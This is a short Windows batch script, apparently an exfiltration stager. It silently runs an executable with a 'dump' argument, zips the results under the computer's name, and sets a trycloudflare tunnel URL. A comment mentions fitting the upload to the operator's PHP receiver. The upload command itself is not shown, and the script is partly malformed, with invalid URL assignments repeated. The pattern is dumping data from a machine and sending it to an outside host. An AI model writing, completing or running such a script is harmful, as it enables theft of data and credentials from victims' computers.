@echo off
cd /d "%~dp0"
"1.exe" "dump" >nul 2>&1

powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"


URL="https://chairs-man-stomach-internship.trycloudflare.com"


:: Added -F "submit=1" and changed to "file[]" to match your PHP script's expectations
URL="https://chairs-man-stomach-internship.trycloudflare.com"



